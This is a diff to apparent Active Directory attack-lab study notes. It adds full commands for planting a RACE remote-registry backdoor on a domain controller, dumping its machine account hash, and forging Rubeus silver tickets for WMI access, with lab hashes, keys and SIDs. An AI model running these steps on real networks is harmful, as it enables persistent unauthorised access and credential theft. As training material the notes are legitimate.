@@ -1590,20 +1590,71 @@ Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc
 
 **Objective:** Extract machine account hash without DA privileges on DC
 
+**Step 1: Create Registry Backdoor (requires DA on student VM)**
 ```powershell
-# As DA, create registry backdoor allowing studentx read access
-Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
+# Start DA process
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+  -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 
+    /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+# In DA process, create registry backdoor
+C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+PS C:\Windows\system32> . C:\AD\Tools\RACE.ps1
+PS C:\Windows\system32> Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
   -Trustee studentx 
   -Verbose
 
-# As studentx, now retrieve machine account hash
-. C:\AD\Tools\RACE.ps1
-Get-RemoteMachineAccountHash -ComputerName dcorp-dc
-
-# Hash can be used for Silver Ticket attacks
+# Output shows backdoor created:
+# - Remote registry service started
+# - ACE added to winreg key with ALL_ACCESS (983103)
+# - studentx can now read registry
 ```
 
-**Use Case:** Gain WMI access without DA after descriptor modification
+**Step 2: Extract Machine Account Hash (as non-DA user)**
+```powershell
+# Now run as studentx (can be unprivileged domain user)
+C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+PS C:\AD\Tools> . C:\AD\Tools\RACE.ps1
+PS C:\AD\Tools> Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+
+# Output:
+# ComputerName       MachineAccountHash
+# dcorp-dc           1be12164a06b817e834eb437dc8f581c
+```
+
+**Step 3: Use Machine Account Hash for Silver Tickets**
+```powershell
+# Create HOST service ticket (for WMI initial connection)
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+  -args evasive-silver 
+    /service:host/dcorp-dc.dollarcorp.moneycorp.local 
+    /rc4:1be12164a06b817e834eb437dc8f581c 
+    /sid:S-1-5-21-719815819-3726368948-3917688648 
+    /ldap 
+    /user:Administrator 
+    /domain:dollarcorp.moneycorp.local 
+    /ppt
+
+# Create RPCSS service ticket (for WMI method execution)
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+  -args evasive-silver 
+    /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local 
+    /rc4:1be12164a06b817e834eb437dc8f581c 
+    /sid:S-1-5-21-719815819-3726368948-3917688648 
+    /ldap 
+    /user:Administrator 
+    /domain:dollarcorp.moneycorp.local 
+    /ppt
+
+# Execute WMI queries with machine account privileges
+Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
+```
+
+**Use Case:** 
+- Non-DA user gains DC WMI access after DA creates backdoor
+- No need for DA privileges after backdoor is established
+- Persists across logoffs
+- Requires registry access (enabled via RACE.ps1 backdoor)
 
 ---
 
